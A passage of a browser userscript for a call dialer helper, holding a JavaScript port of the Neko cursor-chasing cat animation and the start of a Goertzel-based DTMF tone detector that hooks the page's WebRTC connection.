            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABCUlEQVR4nO2W0a7EIAhEnZv9/1/2vpRdtB0YXLtPnaRJExEPKGhrjx5p6se3XX8yQe+3gMgABrEbpARAQH4P4EHal9mA9xeNHYtxR4DNMUNw64+GDFhqp8ik6PyWVLbn5f4B4B1pFvEuLZ2BI923ACBzDqCSndTwKgMUorK4WqrLZQhA2ooMgnkYJsxRs0wYUDB2Wo8CVKvAoKoQdAssxeZQPfll8MgXc8ii9JBqBpSwTp6iKKNKKW2Bn+e+NMX+HChSAG57DSkAPWsoarTMLgIYStH+lVYdDVcAroiW7FgTam28jk+KmoqiKRtXTsAAaA+4WmAuvawfOLsu3QWJ/DOsqn0Pi0er+gdkMKQLf5051AAAAABJRU5ErkJggg==",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA9klEQVR4nO2VzRLDIAiEs528/yvTS5NRyvKjTHsJx6jwueDmOJ54Yi2kK9FrpbiItEEwgDB5F4QFkL5hBwRtAUl+wbVBuDPwCyXCIRySf92+A+LMbPIK74alAAAsJVtRYcUH7lgFHSPVAla4ozVlAAC08AesJAvbPFUICt7rQUvMRaqAJ2/UAus7ALEg0gpo6dltE+DTQU8zYQnH4pVBrAJMINMH1XOtTGVIqw/ZtGOtCIOwADLP8MpEYXf8IHJCERHXYnfd0AOY5E6+dbrOTKr0L8hKXWmJOwO7nm+ooROBAVAPsAp4JhUYk6ScMAgU9+uzT/w33t2WoP+qWuSTAAAAAElFTkSuQmCC",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA70lEQVR4nO1Wyw7DMAgr0/7/l73LmAglBJNKU6X6VDUBm0dCjuPBDYHN9QEvlhxARrJa3xagLBGJklNgBJQJmCy0MhCQtKJnBGQE4UI1C++igJi5GbVFqwQiQv2/XMCVuKeAWe07PUE1oa2xkonI8M2KYbqGOutfMUv/TAmk2uVV8vImh18abEacuLLfzkWkzqN60AF1j+GpH9gxvCNg2owdEd0HSbaBElERAMYha7sSAABpVMnRXNquBAzpjm67TFBgG4qgeoB8kpWQ3gNRNCxcxrwjmQlAhVid24F0chQMLWOPWUGZkIXc720f/BcfQ6ib3RoDepoAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABBElEQVR4nO2W0Q7DIAhFYdmH98/ZEwkiIhebLE16X5bVyj0iRYlePVByOD7og5qLSGayGz8GUJfIRM0hIQBlAyQLrQwEJq3VIwCZQThQzcK3CEBERMw8GHgoP14RBGCDMjOJyPSLCq4BXaWaejj7rKJyBqyx/r/MmD73YLcBIOlFstH+DO8SsmEyFaEJsvgitvGxigkg6MC8A0BkmksEg8aF+oALHlUlvKBuEU6tGT2GTwCW50IHonshyV6AICoAggRE5+4AxJx6YaCk223n7gCGdFfba9QbMgioBsArWUlpH1h1OkQuYz4QrwCkYqzBs8uI3bqgZctqQ5ElM/i+n/vqv/oBKoa/WI/BrT0AAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA1ElEQVR4nO1USQ7EIAxzRvP/L6eXgUlTstDCpYqlqmyJTTAAhUKhUCjsB3uTn93kzOyKWCHASt7IXTwVYO0wRQ4A3wXkvR+tB0B6cLYC3D5J3tr6fwo0vJAV0Emt0jIziC4bPM2NRIwjLvH/GJFoGkJgb+y+hiEiAWk3T6In9QQsJW/l1zmnj0CajYhM40lizzdP3oGeVIqYMCwDcOW7R2Alj8blHwDdvgXWvddVkUcwWh+9A6ERIw9oQaofRP9yeIkjQZJw4JmUgLQoqSOx7i73y3AA4giQ7eL+8PYAAAAASUVORK5CYII=",
            "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA10lEQVR4nO2UUQ7EIAhEYbP3vzL7wxo6IqKpadIwSWNKlXmClahUKpVKpbMSfYb6nDQXCb1vARg5zJ1vABAYrx919zoOgb6bpi05M4cGsJYxmK2AkPYUdnYZMYawHmhH5JljQmbuTLQSrrldo/Oa7wwgZZ7VH9L6nvwNU3oKoJUwAkhdJBmZ0nftW66AOUjEzO2JzKONrN4DHYw18mKBuRARb50BWwUbw7gHg1Dbh9CDsKbYptH85XugSxD03wOC98lqzRElngFZQ4TJAqShLEdi3q73y/QDzYaO9US4bAEAAAAASUVORK5CYII="
        ];


      // Animation states (matching original Neko.h enum)
      const NekoState = {
        STOP: 0,
        WASH: 1,
        SCRATCH: 2,
        YAWN: 3,
        SLEEP: 4,
        AWAKE: 5,
        U_MOVE: 6, // Up
        D_MOVE: 7, // Down
        L_MOVE: 8, // Left
        R_MOVE: 9, // Right
        UL_MOVE: 10, // Up-Left
        UR_MOVE: 11, // Up-Right
        DL_MOVE: 12, // Down-Left
        DR_MOVE: 13, // Down-Right
        U_CLAW: 14, // Clawing upward (at top boundary)
        D_CLAW: 15, // Clawing downward (at bottom boundary)
        L_CLAW: 16, // Clawing left (at left boundary)
        R_CLAW: 17, // Clawing right (at right boundary)
      };

      // Behavior modes (matching original Action enum)
      const BehaviorMode = {
        CHASE_MOUSE: 0,
        RUN_AWAY_FROM_MOUSE: 1,
        RUN_AROUND_RANDOMLY: 2,
        PACE_AROUND_SCREEN: 3,
        RUN_AROUND: 4,
      };

      // Animation timing constants (in frames)
      const STOP_TIME = 4;
      const WASH_TIME = 10;
      const SCRATCH_TIME = 4;
      const YAWN_TIME = 3;
      const AWAKE_TIME = 3;
      const CLAW_TIME = 10;

      // Sprite size
      const SPRITE_SIZE = 32;

      // Animated GIF used in place of the per-state sprite frames. The browser
      // plays the GIF's own timeline, so the cat keeps its movement/behaviour
      // logic but loses the state-specific frames (sleep, claw, wash, ...).
      const NEKO_GIF =
        "https://raw.githubusercontent.com/snowcloudsx/gv-dialer-script/main/neko.gif";
      const NEKO_GIF_WIDTH = 80;
      const NEKO_GIF_RATIO = 498 / 373; // intrinsic height / width
      const NEKO_GIF_MAX_VH = 0.16; // cap the sprite at this share of viewport height

      class Neko {
        constructor(options = {}) {
          // Configuration
          this.fps = options.fps || 120; // Target FPS (default 120 for smooth movement)
          // Original used 16 pixels/tick for 640x480 screens (~2.5% of width)
          // Modern screens are ~3x larger, so default to 24 for similar feel
          this.speed = options.speed || 24;
          this.behaviorMode = options.behaviorMode || BehaviorMode.CHASE_MOUSE;
          this.idleThreshold = options.idleThreshold || 6; // Original m_dwIdleSpace = 6

          // State
          this.state = NekoState.STOP;
          this.tickCount = 0; // Increments every frame (like m_uTickCount)
          this.stateCount = 0; // Increments every 2 original ticks (like m_uStateCount)

          // Position (display position for smooth rendering)
          this.x = options.startX || 0;
          this.y = options.startY || 0;
          // Logic position (updated at original 5 FPS tick rate)
          this.logicX = this.x;
          this.logicY = this.y;
          // Previous logic position (for interpolation)
          this.prevLogicX = this.x;
          this.prevLogicY = this.y;
          // Target tracking
          this.targetX = this.x;
          this.targetY = this.y;
          this.oldTargetX = this.x;
          this.oldTargetY = this.y;
          // Movement deltas (preserved like m_nDX, m_nDY in original)
          this.moveDX = 0;
          this.moveDY = 0;

          // Display size of the cat. The GIF is not square, so width and height
          // are tracked separately; with useGif off these equal SPRITE_SIZE.
          this.useGif = options.useGif !== false; // Default true
          this.applySpriteSize();

          // Bounds - clientWidth excludes scrollbar, innerHeight is viewport height
          this.boundsWidth = document.documentElement.clientWidth - this.spriteW;
          this.boundsHeight = window.innerHeight - this.spriteH;

          // Mouse tracking - null until first mouse event
          // This prevents neko from running somewhere before user moves mouse
          this.mouseX = null;
          this.mouseY = null;
          this.hasMouseMoved = false;

          // DOM element
          this.element = null;
          this.spriteImages = [];
          this.allowBehaviorChange = options.allowBehaviorChange !== false; // Default true

          // Animation lookup table (maps state to sprite indices)
          // Format: [frame1_index, frame2_index]
          // These MUST match the original C++ m_nAnimation table EXACTLY
          // From Neko.cpp lines 40-57:
          this.animationTable = [
            [28, 28], // STOP: m_nAnimation[STOP][0]=28, [1]=28
            [25, 28], // WASH: m_nAnimation[WASH][0]=25, [1]=28
            [26, 27], // SCRATCH: m_nAnimation[SCRATCH][0]=26, [1]=27
            [29, 29], // YAWN: m_nAnimation[YAWN][0]=29, [1]=29
            [30, 31], // SLEEP: m_nAnimation[SLEEP][0]=30, [1]=31
            [0, 0], // AWAKE: m_nAnimation[AWAKE][0]=0, [1]=0
            [1, 2], // U_MOVE: m_nAnimation[U_MOVE][0]=1, [1]=2
            [9, 10], // D_MOVE: m_nAnimation[D_MOVE][0]=9, [1]=10
            [13, 14], // L_MOVE: m_nAnimation[L_MOVE][0]=13, [1]=14
            [5, 6], // R_MOVE: m_nAnimation[R_MOVE][0]=5, [1]=6
            [15, 16], // UL_MOVE: m_nAnimation[UL_MOVE][0]=15, [1]=16
            [3, 4], // UR_MOVE: m_nAnimation[UR_MOVE][0]=3, [1]=4
            [11, 12], // DL_MOVE: m_nAnimation[DL_MOVE][0]=11, [1]=12
            [7, 8], // DR_MOVE: m_nAnimation[DR_MOVE][0]=7, [1]=8
            [17, 18], // U_CLAW: m_nAnimation[U_CLAW][0]=17, [1]=18
            [23, 24], // D_CLAW: m_nAnimation[D_CLAW][0]=23, [1]=24
            [21, 22], // L_CLAW: m_nAnimation[L_CLAW][0]=21, [1]=22
            [19, 20], // R_CLAW: m_nAnimation[R_CLAW][0]=19, [1]=20
          ];

          // Additional state for behaviors
          this.cornerIndex = 0;
          this.ballX = 0;
          this.ballY = 0;
          this.ballVX = 0;
          this.ballVY = 0;

          this.init();
        }

        // Works out the on-screen size of the cat. The GIF is portrait, so width
        // and height differ; it is also capped as a share of viewport height so
        // it stays a reasonable size on short screens.
        applySpriteSize() {
          if (this.useGif) {
            const maxW = Math.max(
              40,
              Math.round((window.innerHeight * NEKO_GIF_MAX_VH) / NEKO_GIF_RATIO)
            );
            this.spriteW = Math.min(NEKO_GIF_WIDTH, maxW);
            this.spriteH = Math.round(this.spriteW * NEKO_GIF_RATIO);
          } else {
            this.spriteW = SPRITE_SIZE;
            this.spriteH = SPRITE_SIZE;
          }
          if (this.element) {
            this.element.style.width = this.spriteW + "px";
            this.element.style.height = this.spriteH + "px";
          }
        }

        init() {
          // Create the neko element with defensive styles to prevent global CSS interference
          this.element = document.createElement("div");
          this.element.className = "neko";
          this.element.style.cssText = `
            position: fixed;
            width: ${this.spriteW}px;
            height: ${this.spriteH}px;
            image-rendering: ${this.useGif ? "auto" : "pixelated"};
            pointer-events: ${this.allowBehaviorChange ? "auto" : "none"};
            cursor: ${this.allowBehaviorChange ? "pointer" : "default"};
            z-index: 999999;
            left: ${this.x}px;
            top: ${this.y}px;
            margin: 0;
            padding: 0;
            border: none;
            background: transparent;
            overflow: visible;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
          `;

          // Create image element with defensive styles to prevent global CSS interference
          const img = document.createElement("img");
          img.style.cssText = `
            width: 100%;
            height: 100%;
            background: transparent;
            border: none;
            margin: 0;
            padding: 0;
            max-width: none;
            max-height: none;
            display: block;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -webkit-user-drag: none;
            pointer-events: none;
          `;
          this.element.appendChild(img);
          if (this.useGif) img.src = NEKO_GIF;

          if (!document.body) {
            document.addEventListener('DOMContentLoaded', () => document.body.appendChild(this.element), { once: true });
          } else {
            document.body.appendChild(this.element);
          }

          // Click to cycle through behaviors
          // Use mousedown instead of click - click requires mouseup on same element,
          // which fails if the cat moves between mousedown and mouseup
          if (this.allowBehaviorChange) {
            this.element.addEventListener("mousedown", (e) => {
              e.stopPropagation();
              e.preventDefault(); // Prevent text selection
              // Make cat appear surprised/awake
              this.setState(NekoState.AWAKE);
              this.cycleBehavior();
            });
          }

          // Track mouse position - set flag on first move
          document.addEventListener("mousemove", (e) => {
            this.mouseX = e.clientX;
            this.mouseY = e.clientY;
            this.hasMouseMoved = true;
          });

          // Update bounds on resize
          window.addEventListener("resize", () => {
            this.applySpriteSize();
            this.boundsWidth = document.documentElement.clientWidth - this.spriteW;
            this.boundsHeight = window.innerHeight - this.spriteH;
          });

          // Random starting position within viewport
          this.x = Math.random() * this.boundsWidth;
          this.y = Math.random() * this.boundsHeight;
          this.logicX = this.x;
          this.logicY = this.y;
          this.prevLogicX = this.x;
          this.prevLogicY = this.y;
          // Initialize target to current position (so no initial movement)
          this.targetX = this.x + this.spriteW / 2;
          this.targetY = this.y + this.spriteH - 1;
          this.oldTargetX = this.targetX;
          this.oldTargetY = this.targetY;
          this.updatePosition();

          // Animation loop
          this.running = false;
          this.intervalId = null;
        }

        start() {
          if (this.running) return;
          this.running = true;

          // Calculate interval from FPS
          // Higher FPS = smoother movement while maintaining same speed
          const interval = 1000 / this.fps;
          this.intervalId = setInterval(() => {
            this.update();
          }, interval);
        }

        stop() {
          this.running = false;
          if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
          }
        }

        setSprites(sprites) {
          this.spriteImages = sprites;
          this.updateSprite();
        }

        updateSprite() {
          const img = this.element && this.element.querySelector("img");
          if (!img) return;

          // GIF mode: the browser plays the animation, so the src is set once and
          // the per-state frame table is bypassed entirely.
          if (this.useGif) {
            if (img.getAttribute("src") !== NEKO_GIF) img.src = NEKO_GIF;
            return;
          }

          if (this.spriteImages.length === 0) return;

          // Get the current animation frame index
          // Uses tickCount which is scaled to match original 5 FPS timing
          let frameIndex;
          if (this.state === NekoState.SLEEP) {
            // Slower animation for sleep (toggles every 4 ticks in original = 800ms)
            frameIndex =
              this.animationTable[this.state][(this.tickCount >> 2) & 0x1];
          } else {
            // Normal animation speed (toggles every tick in original = 200ms)
            frameIndex = this.animationTable[this.state][this.tickCount & 0x1];
          }

          // Update the image
          if (img && this.spriteImages[frameIndex]) {
            img.src = this.spriteImages[frameIndex];
          }
        }

        updatePosition() {
          this.element.style.left = Math.round(this.x) + "px";
          this.element.style.top = Math.round(this.y) + "px";
        }

        update() {
          // Track time accumulator for original tick timing
          // Original runs at 5 FPS (200ms per tick), we run at this.fps
          // We need to accumulate fractional ticks and process when we hit a full tick
          if (this.tickAccumulator === undefined) this.tickAccumulator = 0;

          const originalFPS = 5;
          this.tickAccumulator += originalFPS / this.fps;

          // Process as many original ticks as have accumulated
          while (this.tickAccumulator >= 1) {
            this.tickAccumulator -= 1;
            // Save previous position before processing tick
            this.prevLogicX = this.logicX;
            this.prevLogicY = this.logicY;
            this.processOriginalTick();
          }

          // Smooth interpolation between logic positions
          // tickAccumulator represents progress (0-1) towards next tick
          const t = this.tickAccumulator;
          this.x = this.prevLogicX + (this.logicX - this.prevLogicX) * t;
          this.y = this.prevLogicY + (this.logicY - this.prevLogicY) * t;

          // Update display position every frame
          this.updatePosition();
        }

        processOriginalTick() {
          // This runs at the original 5 FPS equivalent timing
          // Increment tick counter (like m_uTickCount)
          this.tickCount++;
          if (this.tickCount >= 9999) this.tickCount = 0;

          // Increment state counter every 2 ticks (like original)
          if (this.tickCount % 2 === 0) {
            this.stateCount++;
          }

          // Update behavior based on mode
          switch (this.behaviorMode) {
            case BehaviorMode.CHASE_MOUSE:
              this.chaseMouse();
              break;
            case BehaviorMode.RUN_AWAY_FROM_MOUSE:
              this.runAwayFromMouse();
              break;
            case BehaviorMode.RUN_AROUND_RANDOMLY:
              this.runRandomly();
              break;
            case BehaviorMode.PACE_AROUND_SCREEN:
              this.paceAroundScreen();
              break;
            case BehaviorMode.RUN_AROUND:
              this.runAround();
              break;
          }

          // Update animation frame
          this.updateSprite();
        }

        chaseMouse() {
          // Don't chase until mouse has moved at least once
          if (!this.hasMouseMoved) {
            // Just idle in place - pass target that results in zero movement
            this.runTowards(
              this.logicX + this.spriteW / 2,
              this.logicY + this.spriteH - 1
            );
            return;
          }
          this.runTowards(this.mouseX, this.mouseY);
        }

        runAwayFromMouse() {
          // Don't run away until mouse has moved
          if (!this.hasMouseMoved) {
            this.runTowards(
              this.logicX + this.spriteW / 2,
              this.logicY + this.spriteH - 1
            );
            return;
          }

          // Original uses m_dwIdleSpace * 16 as the trigger distance
          const dwLimit = this.idleThreshold * 16;
          const xdiff = this.logicX + this.spriteW / 2 - this.mouseX;
          const ydiff = this.logicY + this.spriteH / 2 - this.mouseY;

          if (Math.abs(xdiff) < dwLimit && Math.abs(ydiff) < dwLimit) {
            // Mouse cursor is too close - run away
            const dLength = Math.sqrt(xdiff * xdiff + ydiff * ydiff);
            let targetX, targetY;
            if (dLength !== 0) {
              targetX = this.logicX + (xdiff / dLength) * dwLimit;
              targetY = this.logicY + (ydiff / dLength) * dwLimit;
            } else {
              targetX = targetY = 32;
            }
            this.runTowards(targetX, targetY);
            // Skip awake animation like original
            if (this.state === NekoState.AWAKE) {
              this.calcDirection(targetX - this.logicX, targetY - this.logicY);
            }
          } else {
            // Keep running to current target (idle in place)
            this.runTowards(this.targetX, this.targetY);
          }
        }

        runRandomly() {
          // Original: increments actionCount while sleeping, picks new target after idleSpace*10
          if (this.state === NekoState.SLEEP) {
            this.actionCount = (this.actionCount || 0) + 1;
          }
          if ((this.actionCount || 0) > this.idleThreshold * 10) {
            this.actionCount = 0;
            this.targetX = Math.random() * this.boundsWidth;
            this.targetY = Math.random() * this.boundsHeight;
            this.runTowards(this.targetX, this.targetY);
          } else {
            this.runTowards(this.targetX, this.targetY);
          }
        }

        paceAroundScreen() {
          // Original checks if neko has stopped moving (m_nDX == 0 && m_nDY == 0)
          // We track this via lastMoveDX/DY
          if (this.lastMoveDX === 0 && this.lastMoveDY === 0) {
            this.cornerIndex = ((this.cornerIndex || 0) + 1) % 4;
          }

          // Corners offset by sprite size (matching original)
          // Target positions that result in neko stopping at the corners
          const corners = [
            [this.spriteW + this.spriteW / 2, this.spriteH + this.spriteH - 1],
            [
              this.spriteW + this.spriteW / 2,
              this.boundsHeight - this.spriteH + this.spriteH - 1,
            ],
            [
              this.boundsWidth - this.spriteW + this.spriteW / 2,
              this.boundsHeight - this.spriteH + this.spriteH - 1,
            ],
            [
              this.boundsWidth - this.spriteW + this.spriteW / 2,
              this.spriteH + this.spriteH - 1,
            ],
          ];

          const target = corners[this.cornerIndex || 0];
          this.runTowards(target[0], target[1]);
        }

        runAround() {
          // Original ball physics with repelling from edges
          const dwBoundingBox = this.speed * 8;

          // Initialize ball if needed (matching original constructor)
          if (this.ballX === 0 && this.ballY === 0) {
            this.ballX = Math.random() * (this.boundsWidth - dwBoundingBox);
            this.ballY = Math.random() * (this.boundsHeight - dwBoundingBox);
            this.ballVX = (Math.random() < 0.5 ? 1 : -1) * (this.speed / 2) + 1;
            this.ballVY = (Math.random() < 0.5 ? 1 : -1) * (this.speed / 2) + 1;
          }

          // Move invisible ball
          this.ballX += this.ballVX;
          this.ballY += this.ballVY;

          // Repel from edges (original logic)
          if (this.ballX < dwBoundingBox) {
            if (this.ballX > 0) this.ballVX++;
            else this.ballVX = -this.ballVX;
          } else if (this.ballX > this.boundsWidth - dwBoundingBox) {
            if (this.ballX < this.boundsWidth) this.ballVX--;
            else this.ballVX = -this.ballVX;
          }

          if (this.ballY < dwBoundingBox) {
            if (this.ballY > 0) this.ballVY++;
            else this.ballVY = -this.ballVY;
          } else if (this.ballY > this.boundsHeight - dwBoundingBox) {
            if (this.ballY < this.boundsHeight) this.ballVY--;
            else this.ballVY = -this.ballVY;
          }

          this.runTowards(this.ballX, this.ballY);
        }

        setState(newState) {
          // Reset counters on state change (like original SetState)
          this.tickCount = 0;
          this.stateCount = 0;
          this.state = newState;
        }

        runTowards(targetX, targetY) {
          // Clamp the target so the whole sprite stays on screen. The anchor is
          // the sprite's bottom-centre, so x is limited to [halfW, right - halfW]
          // and y (the bottom edge) to [spriteH - 1, viewportH - 1]. Without this
          // a tall sprite chases the cursor off the top of short viewports.
          const halfW = this.spriteW / 2;
          const minX = halfW;
          const maxX = Math.max(minX, this.boundsWidth + halfW);
          const minY = this.spriteH - 1;
          const maxY = Math.max(minY, this.boundsHeight + this.spriteH - 1);
          targetX = Math.min(maxX, Math.max(minX, targetX));
          targetY = Math.min(maxY, Math.max(minY, targetY));

          // Store old target for MoveStart check
          this.oldTargetX = this.targetX;
          this.oldTargetY = this.targetY;
          this.targetX = targetX;
          this.targetY = targetY;

          // Calculate distance to target (using logic position, not display position)
          const dx = targetX - this.logicX - this.spriteW / 2; // Stop in middle of cursor
          const dy = targetY - this.logicY - this.spriteH + 1; // Just above cursor
          const distance = Math.sqrt(dx * dx + dy * dy);

          // Calculate movement delta (like original m_nDX, m_nDY)
          // Store as instance variables so they persist across ticks
          // IMPORTANT: Use integers like original to prevent direction flickering
          // which causes state resets and prevents wall clawing
          if (distance !== 0) {
            if (distance <= this.speed) {
              // Less than top speed - jump the gap
              this.moveDX = Math.trunc(dx);
              this.moveDY = Math.trunc(dy);
            } else {
              // More than top speed - run at top speed
              this.moveDX = Math.trunc((this.speed * dx) / distance);
              this.moveDY = Math.trunc((this.speed * dy) / distance);
            }
          } else {
            this.moveDX = 0;
            this.moveDY = 0;
          }

          // Store for paceAroundScreen check
          this.lastMoveDX = this.moveDX;
          this.lastMoveDY = this.moveDY;

          // Check if target moved (MoveStart equivalent)
          const moveStart = !(
            this.oldTargetX >= this.targetX - this.idleThreshold &&
            this.oldTargetX <= this.targetX + this.idleThreshold &&
            this.oldTargetY >= this.targetY - this.idleThreshold &&
            this.oldTargetY <= this.targetY + this.idleThreshold
          );

          // State machine (matching original RunTowards switch)
          switch (this.state) {
            case NekoState.STOP:
              if (moveStart) {
                this.setState(NekoState.AWAKE);
              } else if (this.stateCount >= STOP_TIME) {
                // Check for wall scratching using preserved moveDX/moveDY
                if (this.moveDX < 0 && this.logicX <= 0) {
                  this.setState(NekoState.L_CLAW);
                } else if (this.moveDX > 0 && this.logicX >= this.boundsWidth) {
                  this.setState(NekoState.R_CLAW);
                } else if (this.moveDY < 0 && this.logicY <= 0) {
                  this.setState(NekoState.U_CLAW);
                } else if (this.moveDY > 0 && this.logicY >= this.boundsHeight) {
                  this.setState(NekoState.D_CLAW);
                } else {
                  this.setState(NekoState.WASH);
                }
              }
              break;

            case NekoState.WASH:
              if (moveStart) {
                this.setState(NekoState.AWAKE);
              } else if (this.stateCount >= WASH_TIME) {
                this.setState(NekoState.SCRATCH);
              }
              break;

            case NekoState.SCRATCH:
              if (moveStart) {
                this.setState(NekoState.AWAKE);
              } else if (this.stateCount >= SCRATCH_TIME) {
                this.setState(NekoState.YAWN);
              }
              break;

            case NekoState.YAWN:
              if (moveStart) {
                this.setState(NekoState.AWAKE);
              } else if (this.stateCount >= YAWN_TIME) {
                this.setState(NekoState.SLEEP);
              }
              break;

            case NekoState.SLEEP:
              if (moveStart) {
                this.setState(NekoState.AWAKE);
              }
              break;

            case NekoState.AWAKE:
              if (this.stateCount >= AWAKE_TIME + Math.floor(Math.random() * 20)) {
                this.calcDirection(this.moveDX, this.moveDY);
              }
              break;

            case NekoState.U_MOVE:
            case NekoState.D_MOVE:
            case NekoState.L_MOVE:
            case NekoState.R_MOVE:
            case NekoState.UL_MOVE:
            case NekoState.UR_MOVE:
            case NekoState.DL_MOVE:
            case NekoState.DR_MOVE:
              // Calculate new position using preserved moveDX/moveDY
              let newX = this.logicX + this.moveDX;
              let newY = this.logicY + this.moveDY;
              const wasOutside =
                newX <= 0 ||
                newX >= this.boundsWidth ||
                newY <= 0 ||
                newY >= this.boundsHeight;

              // Update direction
              this.calcDirection(this.moveDX, this.moveDY);

              // Clamp position
              newX = Math.max(0, Math.min(this.boundsWidth, newX));
              newY = Math.max(0, Math.min(this.boundsHeight, newY));
              const notMoved = newX === this.logicX && newY === this.logicY;

              // Stop if we can't go further
              if (wasOutside && notMoved) {
                this.setState(NekoState.STOP);
              } else {
                this.logicX = newX;
                this.logicY = newY;
              }
              break;

            case NekoState.U_CLAW:
            case NekoState.D_CLAW:
            case NekoState.L_CLAW:
            case NekoState.R_CLAW:
              if (moveStart) {
                this.setState(NekoState.AWAKE);
              } else if (this.stateCount >= CLAW_TIME) {
                this.setState(NekoState.SCRATCH);
              }
              break;

            default:
              this.setState(NekoState.STOP);
              break;
          }
        }

        calcDirection(dx, dy) {
          // Calculate direction based on movement delta (like original CalcDirection)
          let newState;

          if (dx === 0 && dy === 0) {
            newState = NekoState.STOP;
          } else {
            const largeX = dx;
            const largeY = -dy; // Y is inverted
            const length = Math.sqrt(largeX * largeX + largeY * largeY);
            const sinTheta = largeY / length;

            const sinPiPer8 = 0.3826834323651;
            const sinPiPer8Times3 = 0.9238795325113;

            if (dx > 0) {
              if (sinTheta > sinPiPer8Times3) {
                newState = NekoState.U_MOVE;
              } else if (sinTheta > sinPiPer8) {
                newState = NekoState.UR_MOVE;
              } else if (sinTheta > -sinPiPer8) {
                newState = NekoState.R_MOVE;
              } else if (sinTheta > -sinPiPer8Times3) {
                newState = NekoState.DR_MOVE;
              } else {
                newState = NekoState.D_MOVE;
              }
            } else {
              if (sinTheta > sinPiPer8Times3) {
                newState = NekoState.U_MOVE;
              } else if (sinTheta > sinPiPer8) {
                newState = NekoState.UL_MOVE;
              } else if (sinTheta > -sinPiPer8) {
                newState = NekoState.L_MOVE;
              } else if (sinTheta > -sinPiPer8Times3) {
                newState = NekoState.DL_MOVE;
              } else {
                newState = NekoState.D_MOVE;
              }
            }
          }

          if (this.state !== newState) {
            this.setState(newState);
          }
        }

        isIdle() {
          return (
            this.state === NekoState.STOP ||
            this.state === NekoState.WASH ||
            this.state === NekoState.SCRATCH ||
            this.state === NekoState.YAWN ||
            this.state === NekoState.SLEEP ||
            this.state === NekoState.AWAKE
          );
        }

        cycleBehavior() {
          // Cycle through behaviors: Chase -> Run Away -> Random -> Pace -> Run Around -> back to Chase
          const behaviors = [
            BehaviorMode.CHASE_MOUSE,
            BehaviorMode.RUN_AWAY_FROM_MOUSE,
            BehaviorMode.RUN_AROUND_RANDOMLY,
            BehaviorMode.PACE_AROUND_SCREEN,
            BehaviorMode.RUN_AROUND,
          ];
          const currentIndex = behaviors.indexOf(this.behaviorMode);
          const nextIndex = (currentIndex + 1) % behaviors.length;
          this.behaviorMode = behaviors[nextIndex];

          // Reset state to wake the cat up if sleeping
          if (this.state === NekoState.SLEEP) {
            this.setState(NekoState.AWAKE);
          }

          // Show behavior name (optional - can be removed if you don't want this)
          const behaviorNames = [
            "Chase Mouse",
            "Run Away From Mouse",
            "Run Around Randomly",
            "Pace Around Screen",
            "Run Around",
          ];
          console.log(`Neko behavior: ${behaviorNames[nextIndex]}`);
        }

        destroy() {
          if (this.element && this.element.parentNode) {
            this.element.parentNode.removeChild(this.element);
          }
        }
      }

      // Export to global scope
      window.Neko = Neko;
      window.NekoState = NekoState;
      window.BehaviorMode = BehaviorMode;

        // Auto-initialize function
        window.createNeko = function(options) {
            const neko = new Neko(options);
            neko.setSprites(NEKO_SPRITES);
            neko.start();
            return neko;
        };

        // Auto-start if script has data-autostart attribute
        if (document.currentScript && document.currentScript.hasAttribute("data-autostart")) {
            if (document.readyState === "loading") {
                document.addEventListener("DOMContentLoaded", function() {
                    window.neko = createNeko();
                });
            } else {
                window.neko = createNeko();
            }
        }
    })();

    // Start the cat. Wrapped so a failure never breaks the panel.
    function initNeko() {
        try {
            if (typeof window.createNeko === "function") {
                window.neko = window.createNeko({ speed: 24, fps: 120 });
                console.log("[Call Helper] Neko started");
                logToBot('neko', 'cat started');
            } else {
                console.warn("[Call Helper] createNeko not available");
            }
        } catch (e) {
            console.error("[Call Helper] Neko failed to start:", e);
        }
    }

    function installDTMFHook() {
        // Read the live enable flag from shared storage. The UI toggles this;
        // default is on. Re-read each block so a mid-call toggle takes effect.
        function isDtmfEnabled() {
            const s = getShared('helperSettings', null);
            if (!s) return true; // no settings yet = default on
            return s.dtmfEnabled !== false;
        }

        // Resolve the page's global object. Tampermonkey runs in a sandbox, so we
        // must patch the REAL page RTCPeerConnection via unsafeWindow when present.
        const pageWin = (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window;

        const NativeRTC = pageWin.RTCPeerConnection || pageWin.webkitRTCPeerConnection;
        if (!NativeRTC) {
            console.log('[Call Helper] DTMF: RTCPeerConnection not found, hook skipped');
            return;
        }

        // ---- Goertzel-based DTMF decoder constants ----
        const LOW_FREQS  = [697, 770, 852, 941];
        const HIGH_FREQS = [1209, 1336, 1477, 1633];
        // DTMF digit grid: rows = low group, cols = high group
        const DIGIT_GRID = [
            ['1','2','3','A'],
            ['4','5','6','B'],
            ['7','8','9','C'],
            ['*','0','#','D']
        ];

        // ---- Tunable detection thresholds ----
        // All thresholds are RATIO-based (scale-invariant), so they don't depend on
        // mic gain, codec attenuation, or absolute sample values. This is what makes
        // detection reliable across machines without per-installation tuning.
        const RMS_GATE        = 0.010;  // block RMS below this = silence (skip). ~-40dBFS.
        // COHERENCE: the dominant scale-invariant discriminator. Goertzel coherently
        // accumulates energy at one frequency, so a PURE sine produces a ratio far
        // above 1.0 regardless of how quiet it is (the accumulator scales with N).
        // Noise/speech spreads its energy across the spectrum, so its single-frequency
        // ratio stays low. Empirically validated against real data: genuine DTMF
        // keypresses measure >= 98 (sustained, typically 200-680) in BOTH groups, while
        // every measured false artifact (speech, music, voicemail, AI greeting) had at
        // least one group below 25. The 25 threshold rejects 157/157 false artifacts
        // in testing while catching every sustained real keypress.
        const MIN_FREQ_RATIO  = 25.0;   // each DTMF freq must coherently exceed total block energy x25
        const TWIST_DB        = 4.0;    // within its group, winner must beat runner-up by >=4 dB
        // BETWEEN-GROUP twist: the two DTMF tones of a real keypress are power-balanced
        // (the high group is allowed to be a bit stronger than the low, per ITU-T Q.24
        // forward twist). Speech artifacts often have one group vastly stronger than the
